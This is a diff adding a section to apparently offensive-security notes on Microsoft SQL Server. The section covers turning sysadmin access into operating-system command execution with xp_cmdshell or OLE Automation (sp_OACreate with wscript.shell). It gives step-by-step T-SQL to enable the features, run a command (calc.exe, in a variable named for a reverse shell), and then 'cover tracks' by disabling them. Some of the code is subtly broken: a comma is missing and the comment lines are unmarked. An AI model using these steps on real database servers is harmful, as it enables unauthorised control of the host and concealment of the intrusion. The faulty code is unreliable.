@@ -17,3 +17,36 @@ If a user can impersonate dbo or another powerful database user, they can escala
 Login impersonation - affects the entire server
 
 User Impersonation - affects only the current database.
+
+**Code Execution**
+As a sysadmin role membership, we can obtain code execution on the Windows server hosting the MSSQL database using the xp_cmdshell stored procedure. Although disabled by default in modern versions, a sysadmin can re-enable it via the sp_configure. The commands then run under the security context of SQL server service account.
+
+As xp_cmdshell is widely recognized to it may be not available. In that case, we can use OLE Automation Procedures, specifically sp_OACreate and sp_OAMethod. These allow SQL Server to interact with the COM objects.
+The attack vector follows three step logic Create, Store and Execute. 
+First, we use the sp_OACreate to instantiate the windows script host object, specifically wscipt.shell. 
+Second, we store the resulting object handle in an integer variable. 
+Finally, we pass the handle to sp_OAMethod to invoke the run method and execute OS commands such as spawning a shell or launching an executable.
+
+Step 1: Expose advanced configuration settings
+EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE;
+GO
+
+Step 2: Enable OLE Automation procedures
+Exec sp_configure 'Ole Automation Procedures', 1;
+RECONFIGURE;
+GO
+
+Step 3: Execute the OLE Automation Payload (Create -> Store -> Execute)
+DECLARE @myrevshell INT;
+Create the COM object and store the handle
+EXEC sp_OACreate 'wscript.shell', @myrevshell OUTPUT;
+Execute the Run method via the stored handle
+EXEC sp_OAMethod @myrevshell, 'Run' NULL, 'calc.exe';
+GO
+
+STEP 4: Cleanup / Cover tracks (Disable the features)
+EXEC sp_configure 'Ole Automation Procedures', 0;
+EXEC sp_configure 'show advanced options', 0;
+RECONFIGURE;
+GO
